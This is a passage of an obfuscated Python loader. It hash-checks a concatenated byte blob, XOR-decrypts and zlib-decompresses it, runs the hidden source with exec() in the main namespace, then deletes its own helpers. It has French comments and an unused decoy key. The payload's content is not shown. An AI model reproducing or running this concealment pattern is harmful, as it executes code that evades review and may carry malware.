_cnEBnnalhr6d3N + _cbVh04O7ingE7T + _cd7J8rhrVRwj9m + _cbi5El6Vu0ofWa + _cpGyU4x4RnZRdE + _c_7TJEJb59VpHB + _cpa7iYJITwuTIA + _csaw9od1sAnAa8 + _cp1JSkUNyXGEVE + _cjMDUcMgleKrzT + _coOD4IkQv3YYCH + _ctJHG_aJlB_DEq + _ceCLBAShSIHaaP + _cvEf4tDFVo3Je4 + _cbud5yViRtk3mp + _czV4h_q1Xf2c2u + _ccpa8sMlf9k08E + _cicSCKnmLQM_17 + _cmEeNpC6XWgmgO + _cqmy6_NBaYO5__ + _cdEdKJ4Z3XvvSo + _cx_S3zfA8OHyTQ + _cgWY4h7HXj3ukO + _cqSFSt_ycxNZ9l + _cqHwr731IpKQgz + _cxvLz14mwalYnQ + _cdvOFYTxKfgb2e + _cyIM4o5t3FjZYF + _cajun9QZOtNHtc + _ckCdmWkTEaMLcV + _cqaHAYuxKIA8Zf + _ccXcQWd_tbut7e + _cl83yW4KIMbxHy + _caqcx5PIXQgxzH + _csm0dOhuui_7MC + _cfrhUKmzzc_m7L + _cw4rR3pi_f88HC + _cilk50A6bQen0e + _cw6hmDQUqgLREc + _ccjxj4_izQlfEZ + _chbuWNyJ_XW8sU + _cuBGJnE8SgmYXx + _ctNeWZ6U7Bx222 + _cupDXOAvtQXxzK + _cn0imGFLlLwb5c + _ckU7_CpB0fDJJO + _cdoPf6J9IFrMrv + _cxH1GIoZsl94yA + _ciEQrrcjW1KQwc + _cqIZPXaRV1LNIr + _ckpnmupE3lxdVe + _cqO7OkzOxgJwQm + _cq6RuuJj3q5J40 + _czcXwTFOozpCK8 + _cagX0c9OL73H_1 + _cfK9axpJ_TpMWI + _chda6XYOib4hRu + _clSMck3b3l9BFY + _cx2xtgEmDE8CaW + _ceJ7Z17JZcNfk1 + _cbOAQQvMyI4nSa + _cx9TIcVC89vRtj + _chg66OESfQ61Jy + _chWFO7YUbl_pZx + _ck3l6RIw9HbUw7 + _cjyBOWZwSSaquO + _crzKp8GpfM5w7P + _ck5h_vSHFbhNCa + _ccBtkKSKijaaxV + _caTHJr3onMh0nZ + _cfna4pr9sDmai4 + _czcyKxTRD7t_KD + _cyJVrUvFoaUKl3 + _cuAh2qyUKWHvOq + _ck1yakDsFsVomL + _caUSwA4q5jp_ar + _cggrMOkzPV28LT + _cp8zzyalL1vufC + _cmzJyPo_y4BNvT + _cmXpfsstXY4I1g + _csrEHYWIUtyrM7 + _cvO5WyLz2f_iuu + _co1ZHA05OUyIHR + _coqxe6t32UXn3J + _cbq3CpbnYpjKQp + _ceIsmnd7gb78TQ + _ctKmSWTTj3EU27 + _czVKOl8xZGX9fM + _cnp8VbN4W3I7EK + _csyA9uQOYVThXu + _cq9tFm0kR3ZkF1 + _cvVcI_bNihj5R6 + _ckAHwAS5WYh2yI + _cjZPckvD_R22X3 + _cr3gHkIcOl5dXu + _chjR6ElFQj46LC + _cr4ZCIsLiNPuEx + _cycaARE7ZwbsLz + _co23fAsZo7VRps + _cyyMXoSUI0KQ5W + _cw6flKlU9eKXpY + _cqhBQB1kLE_zfj + _ckophhVRwX5JbW + _czCyeiBMYLzsWK + _ccHFlRJV6UsQj8 + _coHPjn_dyG9J_b + _ccD82CA7iY8pOh + _ck2Gk3rurZ3q7s + _czyendfvRayf67 + _csbnlJsXeclPGk)
if __import__('hashlib').sha256(_pe3G2YTtByskYs).hexdigest() != '3948bbaa08d8af67492932dcd294abe94bba56cebb67b86865611b1284aa0bd4':
    __import__('sys').exit(1)
_ximvoJuyFfNWRL = bytes([212, 73, 71, 150, 80, 232, 62, 116, 3, 84, 71, 95, 234, 32, 252, 41, 230, 208, 247, 244, 239, 232])
_fki8NL1dP0xk2ZJ = bytes([122, 177, 156, 215, 164, 144, 97, 99, 87, 1, 244, 110, 211, 223, 178, 1, 92, 82, 247, 13, 30, 221])

def _fxu0e1ShXLiGxJA(_bu9KmekjRyZNf8, _kp66fZFB3cOk0d):
    return bytes(_bu9KmekjRyZNf8[_i_TUqC8Q4z_o6p] ^ _kp66fZFB3cOk0d[_i_TUqC8Q4z_o6p % len(_kp66fZFB3cOk0d)] for _i_TUqC8Q4z_o6p in range(len(_bu9KmekjRyZNf8)))

def _fdc4l0J4WqwtqVQ(_tpjeJPogsXmsQX):
    import zlib
    return zlib.decompress(_tpjeJPogsXmsQX) # Un seul niveau de zlib ici pour simplifier

def _femXfPUEpplZ64y():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xeLMxddOJABhzW = _fxu0e1ShXLiGxJA(_pe3G2YTtByskYs, _ximvoJuyFfNWRL)
    # 2. Décompression Zlib
    _dn7ltWo6zT_xjL = _fdc4l0J4WqwtqVQ(_xeLMxddOJABhzW)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dn7ltWo6zT_xjL.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nveU3YKHysjdHv = _main.__dict__
    _nveU3YKHysjdHv.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nveU3YKHysjdHv)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_femXfPUEpplZ64y()
try:
    del _fxu0e1ShXLiGxJA, _fdc4l0J4WqwtqVQ, _femXfPUEpplZ64y
    del _pe3G2YTtByskYs, _ximvoJuyFfNWRL, _fki8NL1dP0xk2ZJ
except:
    pass
